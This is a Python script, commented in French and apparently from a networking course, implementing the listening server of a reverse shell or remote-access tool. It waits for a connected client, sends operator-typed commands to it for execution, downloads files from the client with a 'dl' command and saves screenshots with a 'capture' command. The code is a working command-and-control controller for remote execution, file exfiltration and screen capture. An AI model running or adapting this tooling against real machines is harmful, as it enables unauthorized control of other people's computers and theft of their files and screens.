# SOCKETS RÉSEAU : SERVEUR
#
# socket
#   bind (ip, port)  127.0.0.1 -> localhost
#   listen
#   accept -> socket / (ip, port)
#   close

# already used

import socket

HOST_IP = "10.0.2.15"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST_IP, HOST_PORT))
s.listen()

def sockets_receive_all_data(sockets_p, data_len):
    current_data_len = 0
    total_data = None
    # print("sockets receive all data", data_len)
    while current_data_len < data_len:
        chunk_len = data_len - current_data_len
        if chunk_len > MAX_DATA_SIZE:
            chunk_len = MAX_DATA_SIZE
        data = sockets_p.recv(chunk_len)
        if not data:
            return None
        # print("     len: ",len(data))
        if not total_data:
            total_data = data
        else:
            total_data += data
        current_data_len += len(data)
        # print("   Total data len:", current_data_len, "/",
        #       data_len)
    return total_data


print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
connection_socket, client_address = s.accept()
print(f"Connexion établie avec {client_address}")

def sockets_send_and_receive_all_data(sockets_p, command):
    if not command:
        return None
    sockets_p.sendall(command.encode())

    header = sockets_receive_all_data(sockets_p, 13)
    longuer_data = int(header.decode())

    data_recues = sockets_receive_all_data(sockets_p, longuer_data)

    return data_recues

fil_name = None
while True:
    info = sockets_send_and_receive_all_data(connection_socket, "infos")
    command = input(client_address[0] + ":" + str(client_address[1])
                    + " " + info.decode() + " > ")
    command_split = command.split(" ")

    if not info:
        break
    data_recues=sockets_send_and_receive_all_data(connection_socket, command)

    if len(command_split) == 2 and command_split[0] == "dl":
        fil_name = command_split[1]
    if len(command_split) == 2 and command_split[0] == "capture":
        fil_name = command_split[1] + (".png")
    if not data_recues:
        break
    if fil_name:
        if len(data_recues) == 1 and data_recues == b"":
            print("ERREUE : le fichier", fil_name, " n'existe pas")
        else:
            f = open(fil_name, "wb")
            f.write(data_recues)
            f.close()
            print("Fichier", fil_name, "télechergé")
        fil_name = None
    else:
        print(data_recues.decode())


s.close()
connection_socket.close()
